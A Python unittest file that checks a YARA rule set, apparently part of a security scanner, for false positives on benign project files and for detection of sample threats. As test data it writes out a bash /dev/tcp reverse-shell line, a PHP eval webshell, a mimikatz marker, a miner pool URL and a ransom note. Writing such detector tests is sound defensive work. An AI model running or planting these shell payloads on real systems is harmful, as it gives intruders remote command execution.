"""YARA rule quality tests: precision on benign files, detection of real patterns."""

import shutil
import sys
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from scanners.yara_manager import YaraManager  # noqa: E402

FINDING_SEVERITIES = {"critical", "high", "medium"}


class YaraRuleTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.tmp = ROOT / "tests" / "_tmp_yara_rules"
        shutil.rmtree(cls.tmp, ignore_errors=True)
        cls.tmp.mkdir(parents=True, exist_ok=True)
        cls.manager = YaraManager(cls.tmp)
        assert cls.manager.load_rules(), "default YARA rules failed to compile"

    @classmethod
    def tearDownClass(cls):
        shutil.rmtree(cls.tmp, ignore_errors=True)

    def scan(self, name: str, data: bytes):
        # Match in memory: Windows Defender quarantines files that contain
        # webshell code before YARA can open them.
        return {match.rule for match in self.manager.scan_data(data)
                if getattr(match, "severity", "") in FINDING_SEVERITIES}

    def test_default_rules_compile(self):
        self.assertEqual(len(self.manager.compiled_rulesets), 10)

    def test_benign_project_files_produce_no_findings(self):
        for relative in ("README.md", "build.py", "main_studio.py",
                         "requirements.txt", "docs/ARCHITECTURE.md"):
            path = ROOT / relative
            if not path.exists():
                continue
            matches = {match.rule for match in self.manager.scan_file(path)
                       if getattr(match, "severity", "") in FINDING_SEVERITIES}
            self.assertEqual(matches, set(), f"false positive on {relative}: {matches}")

    def test_mimikatz_binary_is_detected(self):
        matched = self.scan("mimi.exe", b"MZ" + b"\x00" * 256 + b"mimikatz sekurlsa::")
        self.assertIn("credential_dumping_tool", matched)

    def test_miner_binary_is_detected(self):
        matched = self.scan(
            "miner.exe",
            b"MZ" + b"\x00" * 256 + b"stratum+tcp://pool.example.org:3333 xmrig",
        )
        self.assertIn("crypto_miner_binaries", matched)

    def test_ransom_note_is_detected(self):
        matched = self.scan(
            "note.txt",
            b"Your files are encrypted. Send 0.4 Bitcoin to 1BoatSLRHtKNngkdXEeobR76b53LETtpyT to decrypt them.",
        )
        self.assertIn("ransomware_note", matched)

    def test_php_webshell_is_detected(self):
        matched = self.scan("shell.php", b"<?php eval($_POST['cmd']); ?>")
        self.assertIn("php_webshell_eval", matched)

    def test_reverse_shell_is_detected(self):
        matched = self.scan(
            "rev.sh", b"bash -i >& /dev/tcp/10.0.0.5/4444 0>&1\n"
        )
        self.assertIn("reverse_shell", matched)

    def test_documentation_mentioning_malware_is_not_a_finding(self):
        text = (
            b"Ransomware notes often say 'your files are encrypted'. Analysts use "
            b"mimikatz and observe lsass.exe access; UPX is a common packer."
        )
        matched = self.scan("article.md", text)
        self.assertEqual(matched, set(), f"documentation flagged: {matched}")


if __name__ == "__main__":
    unittest.main()
